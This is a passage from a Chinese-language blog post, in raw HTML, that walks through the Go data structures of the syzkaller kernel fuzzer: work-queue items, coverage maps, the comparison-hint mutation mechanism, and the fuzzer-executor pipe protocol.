class="hljs-type">int</span><br>config    *Config<br><br>StatExecs    <span class="hljs-type">uint64</span><br>StatRestarts <span class="hljs-type">uint64</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="10-WorkTriage-x2F-WorkCandidate-x2F-WorkSmash-：实际的单个输入项"><a href="#10-WorkTriage-x2F-WorkCandidate-x2F-WorkSmash-：实际的单个输入项" class="headerlink" title="10. WorkTriage&#x2F;WorkCandidate&#x2F;WorkSmash ：实际的单个输入项"></a>10. WorkTriage&#x2F;WorkCandidate&#x2F;WorkSmash ：实际的单个输入项</h3><p>在 fuzzing 过程当中 我们实际上不直接以 raw 的 <code>Prog</code> 作为输入，我们还想要在输入上标识更多额外的信息——因此便需要加上一层 wrapper，一共有如下<strong>三种类型</strong>：</p><ul><li><code>WorkTriage</code>：可能提供新的覆盖率的程序</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkTriage 为我们在初次执行时所注意到的潜在新覆盖的程序.</span><br><span class="hljs-comment">// 但我们并不能确定是否这是真实的覆盖率.</span><br><span class="hljs-comment">// 在分类中我们明白了这些程序是否真的给出了新的覆盖率，</span><br><span class="hljs-comment">// 若是，则将其最小化并添加到语料库中.</span><br><span class="hljs-keyword">type</span> WorkTriage <span class="hljs-keyword">struct</span> &#123;<br>p     *prog.Prog<span class="hljs-comment">/* 系统调用序列 */</span><br>call  <span class="hljs-type">int</span><span class="hljs-comment">/* interesting 的系统调用号？ */</span><br>info  ipc.CallInfo<span class="hljs-comment">/* 运行结果 */</span><br>flags ProgTypes<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>WorkCandidate</code>：由 hub（也就是 syz-manager）传来的程序</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkCandidate 为来自 hub 的程序.</span><br><span class="hljs-comment">// 我们暂不知道她们对当前 fuzzer 是否有用.</span><br><span class="hljs-comment">// 进程以对本地生成/变异程序相同的方式处理她们.</span><br><span class="hljs-keyword">type</span> WorkCandidate <span class="hljs-keyword">struct</span> &#123;<br>p     *prog.Prog<span class="hljs-comment">/* 系统调用序列 */</span><br>flags ProgTypes<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>WorkSmash</code>：刚刚被加入到语料库中的程序</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkSmash 为刚刚添加到语料库中的程序.</span><br><span class="hljs-comment">// 在 smashing 过程中这些程序将收到一次特别的关注</span><br><span class="hljs-comment">// (emit faults, collect comparison hints, etc).</span><br><span class="hljs-keyword">type</span> WorkSmash <span class="hljs-keyword">struct</span> &#123;<br>p    *prog.Prog<span class="hljs-comment">/* 系统调用序列 */</span><br>call <span class="hljs-type">int</span><span class="hljs-comment">/* interesting 的系统调用号？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="11-Cover：覆盖率信息"><a href="#11-Cover：覆盖率信息" class="headerlink" title="11. Cover：覆盖率信息"></a>11. Cover：覆盖率信息</h3><p>主流的 fuzzer 都是基于覆盖率指导的，syzkaller 也不例外，在 syz-fuzzer 中使用 <code>Cover</code> 结构体表示覆盖率信息：</p><blockquote><p> 没有注释所以笔者也没太看明白是怎么个意思：( </p><p>目前推测 key 是 program counter，val 目前无实际意义只是用来占位表示覆盖到了该地址</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Cover <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="输入生成变异相关"><a href="#输入生成变异相关" class="headerlink" title="输入生成变异相关"></a>输入生成变异相关</h2><h3 id="0-hint-机制"><a href="#0-hint-机制" class="headerlink" title="0. hint 机制"></a>0. hint 机制</h3><p>我们首先来看 syz-executor 中一个重要的变异机制——<code>mutate with hint</code> （可以理解为 hint 辅助的变异），在 <code>hint.go</code> 开头有如下注释：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 一个 hint 大体而言为一个由指向一个程序中一个系统调用的一个参数的指针</span><br><span class="hljs-comment">// 与一个应当被赋给该参数的值（我们称之为 replacer）组成.</span><br><span class="hljs-comment">//（译注：什么B长难句）</span><br><br><span class="hljs-comment">// 一个简易版本的 hints workflow 形如:</span><br><span class="hljs-comment">//1. Fuzzer 启动一个程序 (称之为 hint 种子) 并为程序中的每个系统调用</span><br><span class="hljs-comment">// 收集所有的比较数据.</span><br><span class="hljs-comment">//2. 接下来其尝试将所获得的比较操作数的值于输入参数值进行匹配.</span><br><span class="hljs-comment">//3. 对于每一个这样的匹配，fuzzer 通过将指向的参数使用保存的值进行替换来变异程序.</span><br><span class="hljs-comment">//4. 若获得了一个合法的程序, fuzzer 将其启动并检查是否获得了新的覆盖率.</span><br><span class="hljs-comment">// 要了解更多关于特定突变的信息，参见 prog/hints_test.go.</span><br></code></pre></td></tr></table></figure><h3 id="1-CompMap：用作比较的参数的收缩-x2F-扩展替换取值表【核心】"><a href="#1-CompMap：用作比较的参数的收缩-x2F-扩展替换取值表【核心】" class="headerlink" title="1.CompMap：用作比较的参数的收缩&#x2F;扩展替换取值表【核心】"></a>1.CompMap：用作比较的参数的收缩&#x2F;扩展替换取值表【核心】</h3><p>CompMap 为一个 <code>uint64 </code>到 <code>[uint64 到 bool 的映射]</code> 的映射，用来在<strong>输入变异的时候进行参数值的替换</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 🌰: 对于比较对 &#123;(op1, op2), (op1, op3), (op1, op4), (op2, op1)&#125;</span><br><span class="hljs-comment">// 该映射将存储如下:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//m = &#123;</span><br><span class="hljs-comment">//op1: &#123;map[op2]: true, map[op3]: true, map[op4]: true&#125;,</span><br><span class="hljs-comment">//op2: &#123;map[op1]: true&#125;</span><br><span class="hljs-comment">//&#125;.</span><br><span class="hljs-keyword">type</span> CompMap <span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-type">bool</span><br></code></pre></td></tr></table></figure><p>看着比较抽象，<del>笔者看了半天也不知道这™是个啥玩意</del>，下面我们结合 <code>prog/hints_test.go</code> 中的示例来看：）</p><p><strong>条件分支</strong>是现代编程语言中的一个基本结构，例如我们有如下函数，其会根据不同的取值进入不同的分支：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Models the following code:</span><br><span class="hljs-comment">// void f(u64 qw) &#123;</span><br><span class="hljs-comment">//u8 b = (u8) qw</span><br><span class="hljs-comment">//u16 w = (u16) qw</span><br><span class="hljs-comment">//u32 dw = (u32) qw</span><br><span class="hljs-comment">//if (b == 0xab) &#123;...&#125;</span><br><span class="hljs-comment">//if (w == 0xcdcd) &#123;...&#125;</span><br><span class="hljs-comment">//if (dw == 0xefefefef) &#123;...&#125;</span><br><span class="hljs-comment">//if (qw == 0x0101010101010101) &#123;...&#125;</span><br><span class="hljs-comment">//  &#125;; f(0x1234567890abcdef);</span><br></code></pre></td></tr></table></figure><p>我们给该函数传入的参数为 <code>0x1234567890abcdef</code> 在该函数当中参数由于强制类型转换而发生了<strong>截断</strong>，我们称之为<strong>收缩</strong>（shrink），由于参数截断之后一个条件都匹配不上，所以我们一个分支都进不去：(</p><p>那么如果我们想要走进不同的分支该怎么办呢？ <code>0x1234567890abcdef</code> 截断成 <code>u8</code> 后变成 <code>0xef</code>，如果我们想要走进第一个条件分支那就要替换成 <code>0xab</code>；类似地， <code>0x1234567890abcdef</code> 截断成 <code>u16</code> 后变成 <code>0xcdef</code>，如果我们想要走进第二个条件分支那就要替换成 <code>0xcdcd</code> ； <code>0x1234567890abcdef</code> 截断成 <code>u32</code> 后变成 <code>0xabcdef</code>，如果我们想要走进第三个条件分支那就要替换成 <code>0xefefef</code> ； 而如果我们想要走进最后一个条件分支，则需要将参数整个替换成 <code>0x0101010101010101</code> ，<strong>由此我们得到如下 CompMap</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">CompMap&#123;<br><span class="hljs-number">0xef</span>:               compSet(<span class="hljs-number">0xab</span>, <span class="hljs-number">0xef</span>),<br><span class="hljs-number">0xcdef</span>:             compSet(<span class="hljs-number">0xcdcd</span>),<br><span class="hljs-number">0x90abcdef</span>:         compSet(<span class="hljs-number">0xefefefef</span>),<br><span class="hljs-number">0x1234567890abcdef</span>: compSet(<span class="hljs-number">0x0101010101010101</span>),<br>&#125;,<br></code></pre></td></tr></table></figure><p>根据该 <code>CompMap</code> ，我们最后得到<strong>可以用来替换原参数的新参数值为</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">[]<span class="hljs-type">uint64</span>&#123;<br><span class="hljs-number">0x0101010101010101</span>,<br><span class="hljs-number">0x1234567890abcdab</span>,<br><span class="hljs-number">0x1234567890abcdcd</span>,<br><span class="hljs-number">0x12345678efefefef</span>,<br>&#125;,<br></code></pre></td></tr></table></figure><p>在 syzkaller 的实际运行过程当中，这些比较操作数<strong>对应的是内核中的代码分支</strong>，syzkaller 通过 <code>KCOV</code> 获取这些比较操作数，从而对程序输入变异<strong>以获取更高的代码覆盖率</strong></p><h2 id="全局管控相关"><a href="#全局管控相关" class="headerlink" title="全局管控相关"></a>全局管控相关</h2><h3 id="1-Fuzzer：基本信息"><a href="#1-Fuzzer：基本信息" class="headerlink" title="1. Fuzzer：基本信息"></a>1. Fuzzer：基本信息</h3><p><code>Fuzzer</code> 结构体用以存储一个 syz-fuzzer 的所有基本信息，定义于 <code>syz-fuzzer/fuzzer.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Fuzzer <span class="hljs-keyword">struct</span> &#123;<br>name        <span class="hljs-type">string</span><br>outputType  OutputType<br>config      *ipc.Config<br>execOpts    *ipc.ExecOpts<br>procs       []*Proc<br>gate        *ipc.Gate<br>workQueue   *WorkQueue<br>needPoll    <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>choiceTable *prog.ChoiceTable<br>noMutate    <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span><br><span class="hljs-comment">// stats 域不幸的无法仅是一个 uint64 数组, 因为其在 32 位平台上</span><br><span class="hljs-comment">// 会造成 &quot;unaligned 64-bit atomic operation&quot; 错误</span><br>stats             []<span class="hljs-type">uint64</span><br>manager           *rpctype.RPCClient<br>target            *prog.Target<br>triagedCandidates <span class="hljs-type">uint32</span><br>timeouts          targets.Timeouts<br><br>faultInjectionEnabled    <span class="hljs-type">bool</span><br>comparisonTracingEnabled <span class="hljs-type">bool</span><br>fetchRawCover            <span class="hljs-type">bool</span><br><br>corpusMu     sync.RWMutex<br>corpus       []*prog.Prog<br>corpusHashes <span class="hljs-keyword">map</span>[hash.Sig]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpusPrios  []<span class="hljs-type">int64</span><br>sumPrios     <span class="hljs-type">int64</span><br><br>signalMu     sync.RWMutex<br>corpusSignal signal.Signal <span class="hljs-comment">// 语料库中的输入的信号</span><br>maxSignal    signal.Signal <span class="hljs-comment">// 包括 flakes 在内的所观察到的最大信号</span><br>newSignal    signal.Signal <span class="hljs-comment">// 自上次与 master 同步以来的 diff of maxSignal</span><br><br>checkResult *rpctype.CheckArgs<br>logMu       sync.Mutex<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-Target：目标架构信息"><a href="#2-Target：目标架构信息" class="headerlink" title="2. Target：目标架构信息"></a>2. Target：目标架构信息</h3><p>定义于 <code>prog/target.go</code> 中的 <code>Target</code> 结构体用以表示 fuzzing 目标架构的基本信息：</p><blockquote><p>懒得翻译了，太多字了，自己看：）</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Target describes target OS/arch pair.</span><br><span class="hljs-keyword">type</span> Target <span class="hljs-keyword">struct</span> &#123;<br>OS                <span class="hljs-type">string</span><br>Arch              <span class="hljs-type">string</span><br>Revision          <span class="hljs-type">string</span> <span class="hljs-comment">// unique hash representing revision of the descriptions</span><br>PtrSize           <span class="hljs-type">uint64</span><br>PageSize          <span class="hljs-type">uint64</span><br>NumPages          <span class="hljs-type">uint64</span><br>DataOffset        <span class="hljs-type">uint64</span><br>LittleEndian      <span class="hljs-type">bool</span><br>ExecutorUsesShmem <span class="hljs-type">bool</span><br><br>Syscalls  []*Syscall<br>Resources []*ResourceDesc<br>Consts    []ConstValue<br><br><span class="hljs-comment">// MakeDataMmap creates calls that mmaps target data memory range.</span><br>MakeDataMmap <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> []*Call<br><br><span class="hljs-comment">// Neutralize neutralizes harmful calls by transforming them into non-harmful ones</span><br><span class="hljs-comment">// (e.g. an ioctl that turns off console output is turned into ioctl that turns on output).</span><br><span class="hljs-comment">// fixStructure determines whether it&#x27;s allowed to make structural changes (e.g. add or</span><br><span class="hljs-comment">// remove arguments). It is helpful e.g. when we do neutralization while iterating over the</span><br><span class="hljs-comment">// arguments.</span><br>Neutralize <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *Call, fixStructure <span class="hljs-type">bool</span>)</span></span> <span class="hljs-type">error</span><br><br><span class="hljs-comment">// AnnotateCall annotates a syscall invocation in C reproducers.</span><br><span class="hljs-comment">// The returned string will be placed inside a comment except for the</span><br><span class="hljs-comment">// empty string which will omit the comment.</span><br>AnnotateCall <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c ExecCall)</span></span> <span class="hljs-type">string</span><br><br><span class="hljs-comment">// SpecialTypes allows target to do custom generation/mutation for some struct&#x27;s and union&#x27;s.</span><br><span class="hljs-comment">// Map key is struct/union name for which custom generation/mutation is required.</span><br><span class="hljs-comment">// Map value is custom generation/mutation function that will be called</span><br><span class="hljs-comment">// for the corresponding type. g is helper object that allows generate random numbers,</span><br><span class="hljs-comment">// allocate memory, etc. typ is the struct/union type. old is the old value of the struct/union</span><br><span class="hljs-comment">// for mutation, or nil for generation. The function returns a new value of the struct/union,</span><br><span class="hljs-comment">// and optionally any calls that need to be inserted before the arg reference.</span><br>SpecialTypes <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(g *Gen, typ Type, dir Dir, old Arg)</span></span> (Arg, []*Call)<br><br><span class="hljs-comment">// Resources that play auxiliary role, but widely used throughout all syscalls (e.g. pid/uid).</span><br>AuxResources <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// Additional special invalid pointer values besides NULL to use.</span><br>SpecialPointers []<span class="hljs-type">uint64</span><br><br><span class="hljs-comment">// Special file name length that can provoke bugs (e.g. PATH_MAX).</span><br>SpecialFileLenghts []<span class="hljs-type">int</span><br><br><span class="hljs-comment">// Filled by prog package:</span><br>SyscallMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*Syscall<br>ConstMap   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span><br><br>init        sync.Once<br>initArch    <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(target *Target)</span></span><br>types       []Type<br>resourceMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*ResourceDesc<br><span class="hljs-comment">// Maps resource name to a list of calls that can create the resource.</span><br>resourceCtors <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]*Syscall<br>any           anyTypes<br><br><span class="hljs-comment">// The default ChoiceTable is used only by tests and utilities, so we initialize it lazily.</span><br>defaultOnce        sync.Once<br>defaultChoiceTable *ChoiceTable<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-Proc：syz-executor-实例对象"><a href="#3-Proc：syz-executor-实例对象" class="headerlink" title="3. Proc：syz-executor 实例对象"></a>3. Proc：syz-executor 实例对象</h3><p>在 syz-fuzzer 当中 <code>Proc</code> 结构体被用以表示<strong>一个 syz-executor 实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Proc 表示一个单独的 fuzzing 程序 (executor).</span><br><span class="hljs-keyword">type</span> Proc <span class="hljs-keyword">struct</span> &#123;<br>fuzzer          *Fuzzer<br>pid             <span class="hljs-type">int</span><br>env             *ipc.Env<br>rnd             *rand.Rand<br>execOpts        *ipc.ExecOpts<br>execOptsCollide *ipc.ExecOpts<br>execOptsCover   *ipc.ExecOpts<br>execOptsComps   *ipc.ExecOpts<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>env</code> 成员用以表示单个 syz-executor 的运行环境，定义于 <code>pkg/ipc/ipc.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br>in  []<span class="hljs-type">byte</span><br>out []<span class="hljs-type">byte</span><br><br>cmd       *command<br>inFile    *os.File<br>outFile   *os.File<br>bin       []<span class="hljs-type">string</span><br>linkedBin <span class="hljs-type">string</span><br>pid       <span class="hljs-type">int</span><br>config    *Config<br><br>StatExecs    <span class="hljs-type">uint64</span><br>StatRestarts <span class="hljs-type">uint64</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Env-&gt;cmd</code> 则用以表示执行 syz-executor 的命令信息，包括 pid、配置、命令行参数等：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> command <span class="hljs-keyword">struct</span> &#123;<br>pid      <span class="hljs-type">int</span><br>config   *Config<br>timeout  time.Duration<br>cmd      *exec.Cmd<br>dir      <span class="hljs-type">string</span><br>readDone <span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span><br>exited   <span class="hljs-keyword">chan</span> <span class="hljs-type">error</span><br>inrp     *os.File<br>outwp    *os.File<br>outmem   []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>command-&gt;cmd</code> 为最终用来执行 syz-executor 的命令行，来自于 golang 原生的 exec 库</p><h3 id="4-WorkQueue：待使用的单-syz-fuzer-的全局输入队列"><a href="#4-WorkQueue：待使用的单-syz-fuzer-的全局输入队列" class="headerlink" title="4. WorkQueue：待使用的单 syz-fuzer 的全局输入队列"></a>4. WorkQueue：待使用的单 syz-fuzer 的全局输入队列</h3><p>在 syz-fuzzer 当中所有的输入都被存放在 <code>WorkQueue</code> 队列当中，一个 syz-fuzzer 可能会启动多个 syz-executor 进程，他们共享同一个 <code>WorkQueue</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkQueue 存放全局的 non-fuzzing 工作项目 (参见下面的 Work* 结构体).</span><br><span class="hljs-comment">// WorkQueue 也在工作项目间进行优先排序，例如我们想要在我们碎片化程序前</span><br><span class="hljs-comment">// 分类并向 manager 发送新的输入以在 VM 崩溃的情况下不会永久失去有趣的程序.</span><br><span class="hljs-comment">//（译注：interesting input 在 fuzzing 中是经典概念了，这里应该不需要笔者注释了）</span><br><span class="hljs-keyword">type</span> WorkQueue <span class="hljs-keyword">struct</span> &#123;<br>mu              sync.RWMutex<br>triageCandidate []*WorkTriage<br>candidate       []*WorkCandidate<br>triage          []*WorkTriage<br>smash           []*WorkSmash<br><br>procs          <span class="hljs-type">int</span><br>needCandidates <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们可以看到 <code>WorkQueue</code> 为 <code>WorkTriage/WorkCandidate/WorkSmash</code> 都分别建立了一个新的队列 </p><h2 id="fuzzer-amp-executor-通信相关"><a href="#fuzzer-amp-executor-通信相关" class="headerlink" title="fuzzer &amp; executor 通信相关"></a>fuzzer &amp; executor 通信相关</h2><h3 id="1-executeReq：fuzzer→executor-请求头"><a href="#1-executeReq：fuzzer→executor-请求头" class="headerlink" title="1. executeReq：fuzzer→executor 请求头"></a>1. executeReq：fuzzer→executor 请求头</h3><p>fuzzing 的主体进程由 syz-fuzzer 完成，syz-executor 仅需要完成单个输入程序的运行，因此 syz-fuzzer 需要多次与 syz-executor 间通信：发送待运行的数据并接收运行结果</p><p>syz-fuzzer 与 syz-executor 间通信通过管道完成，因此每次通信前 syz-fuzzer 需要手动告诉 syz-executor 本次待接收的数据类型、长度等信息，这些信息被封装在固定大小的 <code>executeReq</code> 结构体当中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> executeReq <span class="hljs-keyword">struct</span> &#123;<br>magic            <span class="hljs-type">uint64</span><br>envFlags         <span class="hljs-type">uint64</span> <span class="hljs-comment">// env flags</span><br>execFlags        <span class="hljs-type">uint64</span> <span class="hljs-comment">// exec flags</span><br>pid              <span class="hljs-type">uint64</span><br>syscallTimeoutMS <span class="hljs-type">uint64</span><br>programTimeoutMS <span class="hljs-type">uint64</span><br>slowdownScale    <span class="hljs-type">uint64</span><br>progSize         <span class="hljs-type">uint64</span><br><span class="hljs-comment">// 该结构体之后跟着一个 encodingexec 格式的序列化的测试程序.</span><br><span class="hljs-comment">// Both when sent over a pipe or in shared memory.</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以理解为 <code>executeReq</code> 为单次请求的请求头，后面跟着的序列化输入程序 <code>progData</code> 为单次请求的请求体，故 syz-fuzzer 向 syz-executor 发送单个程序执行请求的示例如下：</p><p><img src="https://s2.loli.net/2023/04/24/I6od1evyCE3MZWH.png" alt="image.png"></p><h3 id="2-executeReply-amp-callReply：executor-方响应的单个系统调用执行结果"><a href="#2-executeReply-amp-callReply：executor-方响应的单个系统调用执行结果" class="headerlink" title="2. executeReply &amp; callReply：executor 方响应的单个系统调用执行结果"></a>2. executeReply &amp; callReply：executor 方响应的单个系统调用执行结果</h3><p>有收便有发，syz-executor 在完成执行后会通过另一个管道将执行结果发送给 syz-fuzzer，由于 syzkaller 以单个系统调用为执行的最小粒度，因此syz-executor 每次返回给 syz-fuzzer 的便是<strong>单个系统调用的执行结果</strong>，使用一个头部 <code>executeReply</code> 标识信息，使用 <code>callReply</code> 存储具体结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> executeReply <span class="hljs-keyword">struct</span> &#123;<br>magic <span class="hljs-type">uint32</span><br><span class="hljs-comment">// If done is 0, then this is call completion message followed by callReply.</span><br><span class="hljs-comment">// If done is 1, then program execution is finished and status is set.</span><br>done   <span class="hljs-type">uint32</span><br>status <span class="hljs-type">uint32</span><br>&#125;<br><br><span class="hljs-keyword">type</span> callReply <span class="hljs-keyword">struct</span> &#123;<br>magic      <span class="hljs-type">uint32</span><br>index      <span class="hljs-type">uint32</span> <span class="hljs-comment">// call index in the program</span><br>num        <span class="hljs-type">uint32</span> <span class="hljs-comment">// syscall number (for cross-checking)</span><br>errno      <span class="hljs-type">uint32</span><br>flags      <span class="hljs-type">uint32</span> <span class="hljs-comment">// see CallFlags</span><br>signalSize <span class="hljs-type">uint32</span><br>coverSize  <span class="hljs-type">uint32</span><br>compsSize  <span class="hljs-type">uint32</span><br><span class="hljs-comment">// signal/cover/comps follow</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>executeReply</code> 中的 done 标志位用以标识传输是否结束，对于来自 syz-fuzzer 的单次执行请求，syz-executor 的返回结果如下（以一个 <code>done != 0</code> 的 